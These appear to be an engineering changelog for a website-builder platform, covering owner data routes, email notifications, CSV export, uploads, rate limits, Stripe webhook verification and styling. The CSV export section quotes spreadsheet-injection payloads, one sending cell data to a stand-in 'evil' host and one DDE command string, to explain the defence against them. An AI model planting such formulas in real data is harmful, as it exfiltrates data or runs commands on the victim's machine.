It reads `collect` tables, which `/api/db` refuses by design — that refusal is why a barber shop took bookings nobody could ever see. **This was the oldest open gap in the builder.**
- **404, not 403, for a site that is not yours** — the slug space is public and guessable, so a 403 confirms which names are taken. **Ownership fails CLOSED** (503) if the record cannot be read: the build route made exactly that mistake with `catch {}` and one Supabase timeout handed a site to a stranger.
- The table name is allow-listed against the site's own declared schema (it reaches SQL), `order` is allow-listed against the declared columns, limit/offset are clamped, newest-first by default, and `_fts` is stripped the same way the public read strips it. `test/site-owner.test.mjs` (38 tests, 25 mutations).
- **Writing closed the last "not available yet" in GENERATOR.md** — nothing could write a `display` table after the build, not even the owner, so a café could not fix a price without rebuilding the whole site (which is also why build-time seeding had to exist). Public writes to `display` are still 403; this is the owner's door only. **PATCH/DELETE work on every declared table** (it is all theirs — editing a member's row is moderation), but **POST is refused on `user`/`feed` with 409** because those rows belong to a member and the owner has no id in that database's `_users`, so the row would carry `owner_id` NULL: invisible to every `user` read and unattributable in a feed. Managed columns are dropped even when a table DECLARES one (`ordered`/`trash`/`version` tables carry `position`/`deleted_at`/`_version` in their stored column list). A row id that is not a positive integer is 400, not a Postgres type error surfacing as a 500.
- **`_users` is reachable only through `/members`**, because it is deliberately not part of the declared schema — which is what puts it out of reach of every other route here. That one place names its columns explicitly (`SELECT *` would ship `pass_hash` the moment someone adds a column). Deleting a member leaves their rows alone: `owner_id` stops matching anyone, but a deleted customer's bookings should not silently vanish from the owner's list.
- **The site-delete matcher was tightened to a bare slug.** It matched any DELETE under `/api/site/` and stripped the path down to a slug, so `/api/site/cafe/rows/x/4` arrived as the slug `caferowsx4` — harmless only by luck, and directly in the way of row deletes.
- **A constraint is the caller's answer, not a 500** (`site-errors.mjs`, 2026-07-28). The public write path already mapped duplicate/overlap/bad_ref/full/required/invalid to usable messages; the owner's path was written without it and **answered 500 to a missing required field — measured live**, so the owner had no idea which field they had missed. Now one shared leaf module (no imports, like `site-access.mjs`) that BOTH paths call, with a test asserting on the source that neither keeps its own copy. Anything not a constraint still returns null → logged, 500. `test/site-errors.test.mjs` (7 tests, 11 mutations).
- **The builder's Data panel is wired to all of this** (`loadSiteData` in `public/chat.js`), along with the Submissions and Members modals. They had been calling `/api/site/backend/*` — routes deleted on 2026-07-27 — so every one of those panels had been 404ing. **Analytics and export were wired 2026-07-28 (see above). Still dead, no backend at all: the Database modal's backups and metrics cards, plus `/api/site/scan`, `/api/site/publish`, `/api/site/unpublish`, `/api/site/preview`.**

## Telling the owner a booking arrived (`site-notify.mjs`, 2026-07-28)

- **Nobody did.** A barber shop took an appointment and the only way to find out was to log into isibi and look — which is a fine place to review bookings and a terrible way to learn one exists. Now: a `collect` insert emails the site owner, through the existing Go Farther mailer.
- **`collect` and POST only.** A `user`/`feed` row is a member writing their own content (a recipe, a post) and mailing the owner about each is a notification about someone using the site normally; `display` is the owner's own edit.
- **The cooldown is claimed in the DATABASE, not an isolate.** A form is a public endpoint, so "every POST emails the owner" is a mail bomb aimed at our own customer with a trigger anyone can pull. Cloudflare runs many isolates per colo, so a per-isolate memory would send one email from each — the claim is a single conditional `PATCH site_backends WHERE notify AND notified_at < cutoff RETURNING`, so exactly one caller wins a 5-minute window and the rest do nothing. `notify` + `notified_at` columns added 2026-07-28.
- **Nothing here may throw into the submit.** The booking already succeeded; a broken mailer must not look like a broken form. Every failure path returns a reason instead, and the reason is logged because it runs detached under `ctx.waitUntil` and would otherwise vanish.
- **The submission is attacker-controlled text going into HTML email** — same class as the CSV injection, same discipline: keys and values escaped, `id`/`_fts`/`owner_id` dropped, 12 fields max, values clipped at 200 chars.
- **`POST`/`GET /api/site/<slug>/notify {on}`** is the off switch, with a toggle in the Data panel header. Unsolicited email with no way to stop it is not something to ship. `test/site-notify.test.mjs` (18 tests, 21 mutations).

## What a published site looks like when somebody SHARES it (`site-meta.mjs`, 2026-07-28)

- **A generated site had a `<title>` and nothing else** — no description, no Open Graph — and its `<div id="root">` is empty until JavaScript runs. Google runs JavaScript, so it indexes eventually; **link previews do not**. WhatsApp, iMessage, Slack, Facebook and LinkedIn fetch the HTML once, read the head, and render what is there. So a barber shop sending customers their own link got a bare URL, on every site the builder has ever published.
- `injectMeta` runs at publish time inside `writeSiteDistToR2`, **gated on `index.html`** (rewriting a bundle or a stylesheet would corrupt the dist silently). The head belongs to the built dist, which the model never sees, so this is the only place it can happen.
- **Idempotent by construction** — the block is fenced in `<!--isibi:meta-->` comments and replaced, so republishing fifty times leaves one copy and a renamed site does not keep its old name. Escapes into attributes (brand and description are model-written), collapses whitespace (a newline in an attribute is a broken tag), caps title 70 / description 200, and the twitter card type follows whether there is actually an image (`summary_large_image` with none renders an empty box).
- **It can only ever no-op, never error.** No head, no meta, unparseable input → the html comes back unchanged. A site published without a description is a far smaller problem than one published broken.
- `description` is now a REQUIRED field on `design_schema` — one customer-facing sentence. A revise sends no brief, so the fallback chain is designed → body → the stored `brief` → the instruction. The og:image is the owner's first upload if there is one. `test/site-meta.test.mjs` (12 tests, 14 mutations).

## Taking the data out (`site-export.mjs`, 2026-07-28)

- **`GET /api/site/<slug>/export?table=<t>&format=csv|json`** — the Backups panel has had a working download button since the D1 era wired to `/api/site/backend/export`, a route deleted 2026-07-27, so a barber shop's bookings could be read on screen and never got out of the building. Same `assertOwner` gate, same schema allow-list, `_fts` stripped, oldest-first, capped at `MAX_EXPORT_ROWS` 10000.
- **The interesting part of a CSV export is not the commas — it is CSV INJECTION.** A `collect` table is by definition text a stranger typed into a form, and Excel/LibreOffice/Sheets all EVALUATE a cell beginning `=`, `+`, `-` or `@`. A booking whose notes read `=HYPERLINK("https://evil/?"&A1,"receipt")` builds a live link out of the neighbouring cell the moment the owner opens the file; `=cmd|'/c calc'!A1` is worse. The person attacked is the OWNER, by their own spreadsheet, using data our API handed them. **Quoting does not fix it** — the CSV parser strips the quotes before the formula parser sees the cell — so the value is prefixed with `'`, which is what those programs read as "this is text".
- **`-` is handled narrowly on purpose.** It is a real trigger (`-1+1` evaluates) but also how every negative number begins, so a value that is simply a number is left alone and anything else starting dangerously is neutralised. Blanket-prefixing would corrupt ordinary data in the common case to defend against the rare one.
- Columns are `id`, `created_at`, then the declared ones, then **anything the rows really have that the schema never named** — an export that silently drops a column is not a backup. `attachment`, never `inline`: owner-supplied text must not render as a document on our origin. `test/site-export.test.mjs` (23 tests, 24 mutations).

## Pictures for a published site (`site-uploads.mjs`, 2026-07-28)

- **`/u/<slug>/<file>` has served uploads from R2 since the D1 era and NOTHING ever wrote one** — the read half survived the 2026-07-27 runtime deletion, the write half did not. So no site the builder produced could have a photo. `POST`/`GET /api/site/<slug>/uploads` and `DELETE /api/site/<slug>/uploads/<file>` are the write half, behind the same `assertOwner` gate as rows and analytics.
- **Stored at `uploads/<slug>/`, deliberately NOT under `sites/<slug>/`** — `deleteSitePrefix` wipes that prefix on every publish, and a revise must not delete the owner's photographs.
- **The name is a hash of the CONTENT.** Three things fall out and all matter: a caller cannot choose a path (traversal and cross-site overwrite closed by construction, not by escaping), re-uploading the same picture is free and idempotent, and `/u/` serving `immutable` is actually TRUE because the name *is* the bytes. A hash that does not clean to 32 hex chars is refused rather than stored — `handleUploadDelete` only accepts the shape we mint, so a degenerate name would be an object nothing could ever address again.
- **SVG is refused, deliberately.** `/u/` serves `content-disposition: inline` from isibi.ai and an SVG is a document that can carry `<script>` — stored XSS on our own origin, which `nosniff` does not help with because the type would be honestly declared. PNG/JPEG/WebP/GIF only, decided by **leading bytes**, never the declared Content-Type.
- Caps: 5 MB/file, 200 files and 100 MB per site; a re-upload does not count against them (refusing would be refusing to do nothing). Raw bytes on the wire, not base64 — which would inflate a photo by a third for nothing, since the declared type is ignored anyway. **The Worker digests the bytes directly, NOT `sha256hex`** — that one takes a string and would TextEncode a 5 MB image into a ~20 MB decimal string first.
- **Visitor uploads (`POST /api/db/<slug>/uploads?table=<t>`, 2026-07-28)** — unauthenticated for the same reason the rest of `/api/db` is: a customer booking a haircut has no account. Which makes it a public endpoint accepting arbitrary bytes and serving them from isibi.ai, so the answer to "may I?" is narrow: **the table must be one a visitor can WRITE and must DECLARE an image column**. A barber shop whose booking form is six text fields accepts nothing — that is the answer for most sites, and it is what keeps this from being open image hosting for anyone who knows a slug. Extra limits over the owner's: 2 MB a file, **5 uploads/min per IP per site checked BEFORE the bytes are hashed or listed**, and a visitor allowance of 50 files / 25 MB counted only against files marked `visitor` — so a flood can never crowd the owner out of their own storage. `customMetadata` must be asked for explicitly on an R2 list (`include: ["customMetadata"]`) or every visitor upload looks like one of the owner's and the allowance counts nothing.
- **The schema designer had to be taught, or the feature could never fire.** Measured live 2026-07-28 across all seven generated sites: the designer put image columns on `display` tables **every time** (`image_url`, `photo_url`, `cover`) and on a `collect` or member table **never** — so a visitor upload, which requires one, was refused on every site that exists. The `columns` schema now says what a picture column is, that a `display` one is content the OWNER fills in after the build, and that a `collect`/member one goes in ONLY when the brief says the VISITOR sends a picture. Guarded by a test that reads worker.js.
- Client: `uploadFile`/`useUploadFile` in `@/lib/rows` — upload, then submit the returned URL as an ordinary text field. **The row write stays plain JSON**; there is no multipart and no file field. Generator rule 8 says so, with a drift test asserting the export it names really exists in the template.
- Frontend: image-ish columns in the Data panel's edit form get a thumbnail and an Upload button (`isImageCol`, a naming guess — the column is plain text either way, so a wrong guess costs a button, never a broken save). The generator is told rule 7: a picture column holds a URL, render a bare `<img>`, **always guard it** because the owner fills these in after the build. `test/site-uploads.test.mjs` (27 tests, 23 mutations).

## The owner's traffic (`site_analytics`, wired 2026-07-28)

- **`GET /api/site/<slug>/analytics`** → `{ok, views, visitors, views7, visitors7, series:[{day,views}]}`. `site_hits` has been written on every visit since the D1 era (hashed IP, bots skipped, `ctx.waitUntil` so serving is never slowed) and **nothing had ever read it** — the route the panel calls did not exist, so every published site collected traffic its owner could never see. 64 real hits across 20 slugs by the time this was wired.
- **The RPC's own ownership check was against `published_sites`** — the OLD D1-era table. The current builder records sites in `site_backends`, and the two share **zero** rows, so the check could never pass for any site the builder makes: even with a route, every call would have returned `{ok:false}`. The check moved OUT of SQL into the Worker, where `site-owner.mjs` already does it (fails closed, 404-not-403, tested). One ownership mechanism, not two that can disagree.
- **That also made it service_role-only**, closing the advisor finding that `site_analytics` was `anon`-executable — safe until then only because its internal check happened to refuse everyone.
- `assertOwner` is split out of `openSite` because analytics needs the GATE but not a Neon connection: its numbers are in Supabase, and resolving a connection would be a round trip spent on nothing. The aggregation stays an RPC because count-distinct and a seven-day `generate_series` are not things a REST filter can express.
- **A failed read is 503, never zeros.** "Nobody visited your site" is a very different and much worse thing to tell someone than "try again". A site genuinely unvisited still reads as zeros and an empty week.

## Edge routing for published sites (`site-routing.mjs`)

- **Supabase was on the read path and should not have been.** Answering "which Neon database is this slug?" cost TWO sequential cross-region calls to Supabase (`site_backends` by slug → `user_site_project` by uid) on **every visitor read**, for a value written once at build time that never changes. Supabase is the app's auth/user store, not a routing table for public traffic.
- **KV holds `route:<slug>` → connection string.** Supabase stays the source of truth: a miss falls back to it and backfills, so an unbound or empty namespace is **slow, never wrong** — which is what lets the code ship before the namespace exists. A KV outage degrades to the old path rather than taking the published sites down.
- **Only the connection string is stored, deliberately.** KV is eventually consistent (a write can take ~a minute to reach every colo), which is harmless for a value fixed at build time and would be a real bug for the SCHEMA — a revise adds tables, and a stale schema 404s the site's own new tables. The schema keeps its 15s in-isolate cache and its `_meta` read.
- Written by `ensureSiteBackend` at build (best-effort — a build that succeeded must not fail over a cache write), deleted by `DELETE /api/site/<slug>` **before** the database is dropped (a route outliving its database answers with a connection error instead of an honest 404). Absence is never cached — a slug that does not resolve is usually a build still finishing, and KV entries written without a TTL never expire.
- **The binding does not exist yet.** `.github/workflows/create-kv.yml` (manual) creates the namespace and prints the id for `wrangler.jsonc`; until it is added, `env.SITE_ROUTES` is undefined and the Worker uses the Supabase path. `test/site-routing.test.mjs` (15 tests, mutation-checked).
- **Measured 2026-07-28, why the in-isolate cache alone was not enough:** after deploying `ttl-cache.mjs` the same six-row read was 0.27–2.00s, median **1.05s** — three of twelve requests hit the cache at ~0.3s and the rest paid the full four round trips, because Cloudflare evicts idle isolates and a low-traffic site is almost never warm. The per-isolate cache helps a multi-read page load; only KV removes the Supabase hop for the FIRST read, which is the one a visitor waits on.

## Postgres connection health

- **Measured live 2026-07-28**: one row read on a published site was **~0.9s median** (0.61–2.31s, six rows) because it cost **four sequential round trips** — `site_backends` by slug → `user_site_project` by uid → the site's `_meta` schema → the actual query — with no caching anywhere. Three of the four answer the same thing every time. A visit rendering one list plus a form submit paid ~8 round trips, 6 of them lookups.
- The driver was already right: `@neondatabase/serverless`'s HTTP `neon()` (one round trip per query, no socket handshake), cached per connection string. The latency was round trips, not the client.
- **`ttl-cache.mjs`** — bounded, expiring, per-isolate, with `memoize` so concurrent misses share one in-flight lookup (a cold isolate rendering three lists otherwise fires three identical resolutions before the first returns). `siteBackendBySlug` caches **5 min** (a slug's database is immutable for the life of the site) and is invalidated explicitly by `DELETE /api/site/<slug>` **before** teardown — a cached string pointing at a dropped database answers with a connection error instead of a 404. `loadSiteSchema` caches **15 s** and `applySiteSchema` clears it, short because that invalidation only reaches the isolate that ran the build; every other PoP heals by expiry, and a revise must be visible on the next refresh rather than after a minute of the site 404ing its own new tables. **Never caches null** — a slug that does not resolve is usually one whose build is still finishing. `test/ttl-cache.test.mjs` (15 tests, mutation-checked).
- **Supabase advisors, checked 2026-07-28**: no ERROR-level findings. `site_analytics` is `anon`-executable but verified to return `{ok:false}` to an unauthenticated caller. `add_credits`/`credit_back`/`set_plan` correctly do NOT appear as `authenticated`-executable (service_role only). Open, minor: leaked-password protection is off in Auth; `citext` lives in `public`; ~30 RLS policies call `auth.<fn>()` per row instead of `(select auth.<fn>())`; four unindexed foreign keys on `site_*` tables.

## Backend endpoints & the money path

- **41 `/api/*` routes; 40 gate on `authUser`.** The one that doesn't is `/api/stripe/webhook` (Stripe can't hold a session) — it authenticates by HMAC instead. `/api/m/*` is allow-listed as public because the signed expiring token IN the path IS the credential. There is **no blanket gate** — only the 404 fallthrough at the bottom of the router — so each route gates itself. `test/api-auth.test.mjs` reads worker.js and fails if any route outside the 2-entry allow-list lacks `authUser`, which turns the long-standing "all `/api/*` require auth" claim into an enforced invariant. The smoke test also probes 14 GET routes live against the deployed Worker.
- **`stripe-webhook.mjs`** — the signature check (the *only* thing between a stranger and `add_credits`) plus `mintFromEvent`, the decision of what to credit. Extracted from `worker.js` 2026-07-28 and tested (30 tests, mutation-checked): forged signature, signature over a different body, re-stamped timestamp, replay past the ±300s window, future-dated timestamp, mid-rotation second secret (`STRIPE_WEBHOOK_SECRET` may be comma-separated), empty secret fails closed. Minting guards that each represent free credits if removed: subscription-mode sessions don't mint (their invoice does, else the first month double-grants), unpaid sessions don't, **$0/fully-discounted invoices don't** (a coupon would otherwise buy a month), credits come only from metadata we set at checkout, and `ref` (session/invoice id) makes `add_credits` idempotent against Stripe retries. Top-ups get `tier: null` — only memberships grant storage.
- **`billing.mjs`** — `PLANS`/`TOPUPS`, `selectPurchase`, `checkoutForm`, `LIVE_SUBSCRIPTION_STATUSES`, `falRequestId`, `refundVerdict`/`refundOnResultStatus` (24 tests, mutation-checked). **The subtle one:** a membership's `user_id`/`credits` MUST go under `subscription_data[metadata]`, not the session's own `metadata` — only the former rides onto renewal invoices, so getting it wrong credits month one and then silently nothing while the customer keeps paying. A top-up is the mirror image (session metadata, no recurrence). **Bug found and fixed 2026-07-28:** `PLANS[String(body.plan)]` accepted `"__proto__"`/`"constructor"` (both truthy) and sent Stripe `unit_amount: "undefined"` — now `Object.hasOwn` plus a string/number type check.

## Rate limits

Postgres side: `public.use_quota(p_kind, p_limit)` (SECURITY DEFINER, atomic check+log over the client-locked `usage_log` table), fail-open in the Worker if the RPC is unreachable. **Live gates**: `/api/direct`'s per-call credit charge (`orchestratorCostMicros`) is the real limiter now — there is **no** `useQuota(request,"director",…)` call (the earlier doc claimed one that isn't in the code). The web-search research step keeps its own tighter `useQuota(request, "research", 30)`/day (directly-callable, real-money), checked BEFORE the charge (2026-07-15) so a capped user isn't debited. 429s `daily limit reached`; every director step fails soft client-side (ask→localAsk, compose/revise→local prompt, research→no facts) so a capped user can still generate. The **generation gate stays off** (user's call, 2026-07-03) — to re-enable add `useQuota(request, "gen", 60)` back on /api/video|image|audio.

**Published-site side (`rate-limit.mjs`, live 2026-07-28)**: `/api/db/*` is public and unauthenticated by design, and the schema engine's per-table `rateLimit` + per-app `rateLimits {read, write}` had been parsed and stored in `_meta` since it was written with **nothing ever reading them**. Now enforced in `site-data.mjs` (after the table is resolved, so the declared limit is known — and BEFORE the visitor is resolved, which is a database read) and on the auth branch of `worker.js`. Defaults 300 reads/min, 60 writes/min; a table's own `rateLimit` is a WRITE limit and wins (most-specific, not most-restrictive — both numbers are the owner's own). **Reads share one bucket per site** (the budget protects Neon compute; a page with five lists must not get 5×) while **writes get one per table** (a table capped at 5/min must not share those 5 with the contact form). **Keys on `CF-Connecting-IP` ONLY** — the `|| X-Forwarded-For` fallback the rest of worker.js uses would defeat it entirely, since a caller varying that header mints a fresh bucket per request; no header at all shares the "unknown" bucket. Auth gets a second per-IP gate (30/min, `me` exempt) on top of handleSiteAuth's per-address one, which an attacker rotating addresses walks through. **Fixed a live bug on the way**: `authThrottle` counted with `ttl-cache`, whose `set` re-stamps the expiry, so a blocked caller EXTENDED their own window and never recovered — `makeLimiter` fixes `resetAt` at the first hit. Per-isolate, so a distributed flood still gets through; a real limiter needs Durable Objects. `test/rate-limit.test.mjs` (26 tests, all mutation-checked).

## Auth emails — Cloudflare Email Service (2026-07-30)

**Go Farther was stopped (owner's call), so isibi's own auth mail moved to Cloudflare Email Service.** Sending is **beta**, Workers Paid, 3,000/month included then **$0.35 per 1,000**; inbound routing stays free and unlimited. Limits: 5 MiB a message, 50 recipients, 16 KB of headers, subject 998 chars — and **the daily quota is NOT published**: new accounts start conservative and ramp on sending behaviour and deliverability. That ramp is the one real risk of putting login codes on it, and no document answers it; only sending does.

- **Two senders, on two platforms, and that decides the mechanism for each.** The Worker uses the **`send_email` binding** (`{"name": "EMAIL"}` in `wrangler.jsonc`, `env.EMAIL.send({from,to,subject,html,text})` → `{messageId}`) — **no token to mint, store in GitHub Actions, upload each deploy, or rotate**, which is the actual reason to prefer Cloudflare here. The Supabase `send-email` Edge Function runs on Deno and **cannot** use a binding, so it posts to `https://api.cloudflare.com/client/v4/accounts/{id}/email/sending/send` with a Bearer token. That is the only token in the system: `CF_ACCOUNT_ID` + `CF_EMAIL_TOKEN` in Supabase's Edge Function secrets, NOT in `deploy.yml`.
- **MAIL IS LIVE (measured 2026-08-06): `isibi.ai` is onboarded, Configured, 35 sent, and the DAILY QUOTA IS 200** — this file said the quota was unpublished and that sending had not shipped, both stale. 200/day is the ceiling for login codes AND booking notifications across every site on the platform, so it is a real number to watch rather than a formality. **`env.EMAIL` is `undefined` until sending is enabled and the domain is verified**, not an error — so an unprovisioned binding is a TypeError on whatever public endpoint touched it. `sendMail()` refuses with a named message and `notifyOwnerOfSubmission` no-ops on `!env.EMAIL`. Guarded at BOTH ends: one test asserts the Worker calls `env.EMAIL.send`, another asserts `wrangler.jsonc` declares that exact name — either alone passes on a Worker calling a binding nobody declared.
- **THE EDGE FUNCTION IS DEPLOYED (v12, 2026-08-07) AND NOTHING IN CI DEPLOYS IT.** `deploy.yml` runs wrangler, which touches Cloudflare only; Supabase Edge Functions are outside that path entirely. So the repo source and the live function drift silently, and **that drift was a live outage for eight days**: the rebrand updated `supabase/functions/send-email/index.ts` on 2026-07-30 and the deployed v11 kept sending `isibi <login@isibi.ai>` with a `https://isibi.ai/confirm` link — a dead sender domain and a dead link, i.e. nobody could create an account. **Anything that edits that file has to be deployed by hand**, and the check is `get_edge_function`, not `git log`.
- **The config check runs BEFORE the signature check, which makes an unsigned POST a free probe of whether mail is configured.** `401 invalid signature` means both `CF_ACCOUNT_ID` and `CF_EMAIL_TOKEN` are set (it got past the config gate); `200 {}` means one is missing and the log names which. Nothing is sent either way — the signature fails first. Measured 2026-08-07: **401, so both are set.**
- **The earlier note here claimed the rewrite returns 500 at the config check. It does not, and the distinction is the whole design.** Missing `CF_*` → log loudly, return **200**, let the account be created: GoTrue treats any non-2xx from this hook as failure of the whole auth operation, so a 500 there means one wrong character in a secret stops people signing up at all — strictly worse than mail not arriving. Only a missing `SEND_EMAIL_HOOK_SECRET` returns 500, because that one is the only thing proving the caller is GoTrue and not a stranger, and failing it open would let anyone trigger mail to any address.
- **PROVEN END TO END 2026-08-07 — the code arrived.** A real `POST /auth/v1/otp` for the owner's own address gave, in order: auth log `"msg":"Hook ran successfully","success":true,"error":null` against the function URL (**the hook is enabled and pointed here** — nothing in the repo asserts that, so it can only be measured); function log `POST | 200 | …send-email` on **version 12**, so the request reached the NEW code; **200 rather than 401**, which is `SEND_EMAIL_HOOK_SECRET` verifying correctly; the config gate passed; and **the owner received the email**. Sign-in works again after eight days dark.
- **The inbox was the only thing that could have closed it, and that is the lesson to keep.** Three surfaces answer three DIFFERENT questions — auth log: *was the hook called*; function log: *did the provider accept*; inbox: *did it arrive*. The Cloudflare call is detached under `EdgeRuntime.waitUntil` and its only trace is a `console.error` on failure, and `get_logs(service:"edge-function")` returns request lines, so it was never established that function console output appears on that stream at all: **"no error logged" was evidence of nothing.** Reading the first surface as the third is exactly how the outage survived eight days and a rebrand. `EMAIL_FROM` is therefore also confirmed absent or correct — a stale `isibi.ai` value there would have overridden the right default and Cloudflare would have refused the sender.
- **No idempotency key any more.** Cloudflare's send body is `to/from/subject/html/text` and its API reference showed nothing for one; sending an unknown field risks the whole request being refused. Go Farther had one, so a GoTrue hook retry can now deliver the same code twice — a smaller problem than a rejected body, and the codes stay single-use.
- **The background send stays**, and not as an optimisation: GoTrue aborts this hook after 5s and a signup that trips it fails outright with "Failed to reach hook within maximum time". Cloudflare should beat Go Farther's ~3.5-4s round trip, but the hook must not depend on that.
- Every message carries a **plain-text part**, derived from the html when a caller gives none — a message with no text/plain alternative scores worse with spam filters, and a booking notification in a junk folder is the same as one never sent.
- **`notifyOwnerOfSubmission` IS wired** (corrected 2026-08-06 — this line said it had zero callers, which stopped being true and stayed in the notes). It lost its trigger point when `site-data.mjs` was deleted, and the fix was NOT the Postgres trigger + queue table + cron this line prescribed. That plan assumed the Worker had left the write path; it has not. **`proxySiteService` IS the write path** — every insert a published site makes goes through it — so the hook is one branch on a successful POST to a `collect` table, fire-and-forget under `waitUntil`. `test/notify-wiring.test.mjs` asserts something calls it, which is what would have caught the zero-caller state in the first place. **It still sends nothing until `env.EMAIL` exists**, so the remaining work is the mail domain, not the plumbing.
- **Still on the old brand:** the login-code email is `#0a0a0b` with the pink→amber gradient logo, from before the platform went black-and-white on 2026-07-23. Left alone deliberately — design is the owner's call — and it is the one customer-facing surface still wearing it.

## The text on every surface was worked out and could not be corrected (2026-08-18)

**Nine colours were WRITABLE and not askable, so nobody could name one.** `withContrast` picks them — near-black on a light surface, near-white on a dark one — and *"the text on the cards is too light"* had no path at any price.

- **THE EXCLUSION WAS DELIBERATE AND THE REASONING WAS WRONG.** The guard's own words: the ask list must not widen with the write list *"or a designer could set a derived partner directly and defeat the contrast pass"*. Measured: it does not defeat it, it **overrides** it — `withContrast` has always skipped a pairing whose partner is already present (`if (!(surface in out) || fg in out) continue;`), and `muted-foreground` carries the same guard. So an explicit value has always won, and the refusal did not protect the derivation: it made the automatic choice a **ceiling** instead of a default.
- **NOTHING IN THE DERIVATION CHANGED, which is what makes this a list rather than a feature.** The whole change is that `ASKABLE` now includes the pairings. **Asserted, because the whole thing rests on it** — a mutant removing the `fg in out` skip makes naming a text colour do nothing, silently.
- **DERIVED FROM `PAIRS`**, so a tenth surface added there is askable without anybody editing a list — the trick `WRITABLE` was already using, now shared. `ASKABLE` and `WRITABLE` are the same 24 names and stay separate declarations, because they answer different questions and the day they diverge again the split is what makes it expressible.
- **THE PERMISSION AND THE RESTRAINT ARE ONE CHANGE, and only the restraint lives in prose.** The automatic pairing is right nearly always, so a model that names both on every colour change gives the customer a text colour they never chose. The tool says the text is worked out for you AND says when to override it — **the positive case matters as much**, because a flat prohibition leaves the nine unreachable in practice however askable they are in code, which is the failure `publicView`'s description has cost a whole site over twice. **Found by mutation: the description was the sweep's only survivor**, guarded now at both halves.
- **EVERY NAME HAS TO READ DIFFERENTLY**, from the surface's own name and from `site-style.mjs`'s list, or one reply says *"Updated the look — card colour, card colour"* about two different changes. `foreground` is already "text colour", so these say WHERE: *text on cards*, *text in menus*, *button text*, *quiet text*. Asserted as a property over the whole askable list.
- **~144 tokens on the tool schema**, measured, in the cached block.
- 3397 tests, **8/8 mutations as expected** from a verified-green baseline with a comment-only control that had to survive. Driven end to end through the real chain — `parseTokens` keeps it, `withContrast` leaves it alone, `tokensCss` writes it, and the reply reads *"Updated the look — card colour, text on cards."* **NOT PROVEN LIVE** — the model account is out of credit.

## One page's own colours (2026-08-18)

**The look was site-wide — one `site_look` row, one `site_tokens` row, one stylesheet — so *"make the booking page calmer"* was unreachable at ANY price**: not by typing, and not by paying for a rebuild either, because there was no scope to write it into.

- **A SCOPE, NOT A SECOND STYLESHEET.** The tokens are CSS custom properties and a site is one bundle with one stylesheet, so a page's own colours are `body[data-page="/book"] { --background: … }` appended after the site's — the same later-wins mechanism `writeTokens` already runs on, one level down. **`body[…]` rather than `[…]`**: a bare attribute selector is (0,1,0), exactly `:root`'s, so it would depend on this block being appended last — true today and one refactor from not being.
- **STAMPED ON `<body>`, from the router's MATCHES.** Every page has that ancestor whether or not it uses the site frame — **16 of 318 exemplars do not** — and the deepest match's pathname is the same reading `head()` uses, with the basepath already stripped, so the selector is right at `/s/<slug>/book` and at `/book`. `location.pathname` carries the basepath on one mount and not the other, and would match on neither.
- **MEASURED THROUGH THE REAL CONTAINER AND A REAL BROWSER before the lane was wired.** The scoped block lands in the stylesheet; `/` keeps the theme's `oklch(0.975 0.004 90)` and `/book` gets `rgb(16, 20, 24)`; **and the stamp follows CLIENT-SIDE navigation**, which a fresh load cannot show and which is the half that would have been silently broken.
- **`withContrast` RUNS PER PAGE, which is why `pageTokensFor` is a function rather than the stored object passed through.** A page moved onto a dark ground needs ITS OWN readable text colour; derived once for the site, every line of body copy there stays in the light theme's dark grey — a real bug when the site-wide patch shipped, arriving one scope down.
- **A PATH THAT CANNOT GO IN A SELECTOR IS REFUSED, NEVER ESCAPED.** The value lands inside an attribute selector, where a quote closes the rule, and there is no correct escape for arbitrary text there — the rule `isColor` already lives under. Refused twice, in the Worker and again in the container, because those are two layers and only one of them knows how many pages the site has.
- **A PAGE THE SITE DOES NOT HAVE IS IGNORED.** A selector for a page nobody can reach is a change reported as applied that no visitor sees, and the customer's colours would sit in `_meta` for ever.
- **ITS OWN `_meta` KEY, and the reason is the one `site_logo` already records**: `mergeTokens` rebuilds its output from the token names alone and drops anything else stored there, so a customer changing a site colour would silently lose every page override they had. **Read on BOTH publish paths** — a path that does not send it sends nothing, and nothing means every page is back on the site's colours, on an edit that asked for something else entirely.
- **WRITTEN WHENEVER IT MOVED, INCLUDING TO NOTHING.** The three writes beside it are gated on being non-empty, which is right for them — they only grow. This one can go back to `{}` when the last override is put back, and gated the same way that write is skipped and the site keeps what it was just told to drop.
- **TOKENS ONLY, DELIBERATELY.** The 17 style axes emit ordinary RULES against global selectors (`.lucide`, `.border-input`, a radius on the button selector), so scoping them means prefixing every selector a theme emits — a much larger change with a much worse failure mode. *"Make the booking page calmer"* is a colour question.
- **THREE EXISTING GUARDS WENT RED ON CORRECT CHANGES, all the same own-goal.** A 900-byte window after the container payload (outrun by a documented field), the rollback list pinned to its exact two entries, and the nothing-moved condition pinned to its exact three terms — twice. All re-anchored on the property: the rollback one is now DERIVED from the lane's own writes, so a fourth key is covered without anybody remembering the file.
- **AND MY OWN ROUTER ASSERTION WAS VACUOUS.** `/one page/i` matched the clause's own parenthetical — *"a request to change one page's TYPEFACE … is not this"* — which says the OPPOSITE of what was being asserted. A phrase appearing in both a claim and its exclusion discriminates nothing. Found by mutation.
- 3396 tests, template typechecks, `site build` **138/138** against the real container, **20/20 mutations as expected** from a verified-green baseline with a comment-only control that had to survive. **NOT PROVEN LIVE** — the model account is out of credit, so no customer edit has run through the lane.

## A photograph was always cropped from the middle (2026-08-18)

**`SafeImage` renders `object-cover` inside a fixed ratio and never set `object-position`**, so every picture on every published site was cropped from the CENTRE. A head-and-shoulders photo in a 21/9 hero loses the head; a tall shopfront in a 4/3 card loses the sign. Neither is a fault in the photograph, and **neither was fixable at any price** — the owner had to re-crop the file and upload it again.

- **PER SLOT, NOT PER PICTURE, and that is the decision rather than an accident.** The same photograph legitimately wants different framing in a 21/9 banner and a 1/1 avatar, so a focal point stored against the FILE is right in one place and wrong in the other. It also makes the setting addressable: the picture lane reads page source, so a value written on the ELEMENT is one it can find and change.
- **THE KIT ALREADY HAD A `focal-point.tsx` AND IT IS NOT THIS.** It takes `value` and `onChange` — an interactive picker for an admin screen — and is used by **0 of 328 corpus pages**. The DISPLAY side genuinely had none, which is why reading the kit before building mattered.
- **MEASURED IN A REAL BROWSER BEFORE A LINE OF THE LANE WAS WRITTEN.** A tall image with a red band at the top and a blue one at the bottom, in a 21/9 box: `focus="top"` shows red, `focus="bottom"` shows blue, and the computed positions are `50% 0%` / `50% 50%` / `50% 100%` with an unrecognised value falling back to the middle.
- **`centre` REMOVES THE ATTRIBUTE rather than writing the word.** A centred picture and one that never had a focus are the same picture, so a site put back is byte-identical to one that was never touched — the source is stored and re-read on every later edit. Same rule the frame's arrangement lives under one prop family over.
